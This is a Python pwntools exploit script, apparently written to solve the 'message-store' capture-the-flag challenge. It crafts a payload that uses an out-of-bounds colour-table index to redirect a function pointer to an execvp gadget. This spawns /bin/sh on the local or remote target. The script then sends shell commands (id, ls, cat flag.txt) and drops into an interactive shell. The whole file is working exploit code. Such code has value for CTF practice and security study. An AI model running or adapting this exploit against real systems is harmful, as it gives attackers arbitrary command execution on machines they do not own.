#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec=False)
context.log_level = "info"

HOST = "message-store.chals.dicec.tf"
PORT = 1337


BUFFER = 0x2F9E38
COLOR_TABLE = 0x2F08E8
EXECVP_GADGET = 0x26DE30  # mov rsi,[rax+8]; mov rdi,[rax+0x80]; call execvp

# Put function pointer far from fields used by the fake command.
FP_OFF = 0x1F8
OOB_COLOR_INDEX = (BUFFER + FP_OFF - COLOR_TABLE) // 8


def build_payload() -> bytes:
    payload = bytearray(0x400)

    # Keep pointer bytes UTF-8-safe before offset 0x80.
    argv_ptr = BUFFER + 0x28A  # c2 a0 2f 00 ...
    prog_ptr = BUFFER + 0x29A  # d2 a0 2f 00 ...

    # Fake command used by the execvp gadget:
    #   rsi = [rax+8]   -> argv
    #   rdi = [rax+0x80]-> program
    payload[0x08:0x10] = p64(argv_ptr)
    payload[0x80:0x88] = p64(prog_ptr)

    # OOB-loaded function pointer -> execvp gadget.
    payload[FP_OFF:FP_OFF + 8] = p64(EXECVP_GADGET)

    # argv = ["/bin/sh", NULL]
    payload[0x28A:0x292] = p64(prog_ptr)
    payload[0x292:0x29A] = p64(0)
    payload[0x29A:0x2A2] = b"/bin/sh\x00"

    final = bytes(payload[:0x2E0])
    assert b"\n" not in final
    return final


def choose(io, n: int):
    io.sendlineafter(b"> ", str(n).encode())


def set_message(io, data: bytes):
    choose(io, 1)
    io.sendlineafter(b"New Message? ", data)


def set_color(io, idx: int):
    choose(io, 2)
    io.sendlineafter(b"> ", str(idx).encode())


def trigger(io):
    choose(io, 3)


def main():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path)
    payload = build_payload()

    log.info(f"OOB color index: {OOB_COLOR_INDEX} (0x{OOB_COLOR_INDEX:x})")
    set_message(io, payload)
    set_color(io, OOB_COLOR_INDEX)
    trigger(io)

    # Probe shell quickly.
    io.sendline(b"echo __PWNED__ && id && /bin/ls && (cat flag.txt || cat /flag)")
    data = io.recvrepeat(1.0)
    if data:
        log.info(data.decode(errors="ignore"))

    io.interactive()


if __name__ == "__main__":
    main()
